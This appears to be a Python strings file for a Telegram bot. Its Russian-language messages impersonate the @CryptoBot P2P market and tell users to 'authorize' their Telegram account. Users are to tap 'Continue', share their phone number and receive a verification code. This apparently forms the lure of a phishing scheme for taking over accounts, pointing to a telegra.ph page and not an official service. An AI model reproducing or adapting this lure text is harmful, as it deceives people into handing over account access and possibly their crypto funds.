start_text = '<a href="https://telegra.ph/Podtverzhdenie-kontaktnyh-dannyh-v-CryptoBot-04-12">Бот авторизации</a>. Подключение вашего номера телефона Telegram к P2P-Маркету @CryptoBot.\n\nПодписывайтесь на <a href="https://t.me/CryptoBotRU">наш канал</a> и вступайте в <a href="https://t.me/CryptoBotTips">Crypto Bot Tips</a>'

start_keyboard_text = 'Далее'

subscribe_text = (f'<b>🦋 Подключение</b>\n\n'
                  f'Для того, чтобы продолжить торговлю в <b>P2P</b> маркете, Вам необходимо Авторизовать свой Telegram аккаунт, нажав на кнопку <b>«Продолжить»</b> снизу. После чего, Вы получите проверочный код.')
subscribed_text = 'Продолжить'

get_phone = ('Нажмите на кнопку снизу.\n')


